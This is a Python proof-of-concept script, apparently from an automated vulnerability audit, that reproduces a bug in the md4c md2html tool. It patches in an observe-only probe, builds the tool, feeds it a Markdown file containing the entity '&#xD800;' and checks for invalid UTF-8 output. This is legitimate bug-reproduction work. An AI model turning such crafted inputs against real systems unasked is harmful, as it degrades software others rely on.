#!/usr/bin/env python3
# Tier-3 PoC for finding #2: surrogate codepoint entity emitted as invalid UTF-8.
# Entry point: md2html CLI reading a Markdown file (public input path).
# Sink: render_utf8_codepoint() in src/md4c-html.c.
# The sink probe is observe-only: it runs inside the sink, does not change
# codepoint, arguments, output or control flow, and writes the sentinel only
# when a surrogate codepoint arrives from the payload.
import os, shutil, subprocess, tempfile

SRC = "/workspace/src"
CLI = "/workspace/md2html"
ROOT = os.getcwd()

work = tempfile.mkdtemp(prefix="repro2_")
tree_src = os.path.join(work, "src")
tree_md = os.path.join(work, "md2html")
shutil.copytree(SRC, tree_src)
shutil.copytree(CLI, tree_md)

# Observe-only probe inserted before the unmodified range check.
path = os.path.join(tree_src, "md4c-html.c")
text = open(path, encoding="utf-8").read()
anchor = "    if(0 < codepoint  &&  codepoint <= 0x10ffff)\n        fn_append(r, (char*)utf8, (MD_SIZE)n);"
assert text.count(anchor) == 1, "sink anchor not found"
probe = (
    "    if(0xD800 <= codepoint && codepoint <= 0xDFFF) {\n"
    "        FILE* mantis_f = fopen(\"sentinel_2\", \"a\");\n"
    "        if(mantis_f) { fputs(\"MANTIS_REACHED_ENTRYPOINT\\n\", mantis_f); fclose(mantis_f); }\n"
    "    }\n"
)
text = text.replace(anchor, probe + anchor)
open(path, "w", encoding="utf-8").write(text)

exe = os.path.join(work, "md2html_bin")
cc = ["gcc", "-std=c99", "-DMD_VERSION_MAJOR=0", "-DMD_VERSION_MINOR=4",
      "-DMD_VERSION_RELEASE=8", "-I" + tree_src, "-I" + tree_md,
      "-o", exe,
      os.path.join(tree_md, "md2html.c"), os.path.join(tree_md, "cmdline.c"),
      os.path.join(tree_src, "md4c.c"), os.path.join(tree_src, "md4c-html.c"),
      os.path.join(tree_src, "entity.c")]
r = subprocess.run(cc, capture_output=True, text=True)
if r.returncode != 0:
    print("SETUP_FAILURE: build failed", r.stderr[-800:])
    raise SystemExit(2)

# Payload delivered through the public input file of the CLI.
payload_md = work + "/payload.md"
with open(payload_md, "w", encoding="utf-8") as f:
    f.write("x &#xD800; y\n")
out_html = work + "/out.html"
r = subprocess.run([exe, payload_md, "-o", out_html], capture_output=True)
if r.returncode != 0:
    print("SETUP_FAILURE: cli rc", r.returncode, r.stderr[-400:])
    raise SystemExit(3)

data = open(out_html, "rb").read()
print("output bytes:", data.hex(" "))
if b"\xed\xa0\x80" in data:
    print("INVALID_UTF8_SURROGATE_EMITTED")
